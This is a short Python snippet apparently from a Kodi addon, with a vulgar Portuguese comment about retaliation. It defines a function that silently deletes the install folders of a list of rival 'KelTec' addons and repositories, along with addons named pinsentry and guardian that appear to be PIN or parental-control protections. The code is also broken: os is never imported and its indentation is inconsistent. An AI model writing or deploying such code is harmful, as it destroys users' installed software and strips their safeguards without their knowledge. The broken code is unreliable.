import xbmc
import shutil

###
### NAO SEJA CHUPA ROLA POIS CHUMBO TROCADO ###
###

def burnout():
    for a in ['special://home/addons/KeltecMP.repository','special://home/addons/ElementumKTMP.repository','special://home/addons/plugin.program.keltecmpleiawizard','special://home/addons/plugin.video.KelTec-MP.torrents','special://home/addons/plugin.video.KeltecMP','special://home/addons/plugin.video.KeltecMPIPTV','special://home/addons/script.KelTecMP.Builds','special://home/addons/script.keltecmpmaintenance','special://home/addons/skin.xonfluence-KelTec-Media-Play','special://home/addons/script.pinsentry','special://home/addons/script.pinsentry','special://home/addons/script.guardian','special://home/addons/script.service.module']:
        existe = xbmc.translatePath(a)
	if os.path.exists(existe)==True:
		shutil.rmtree(existe)
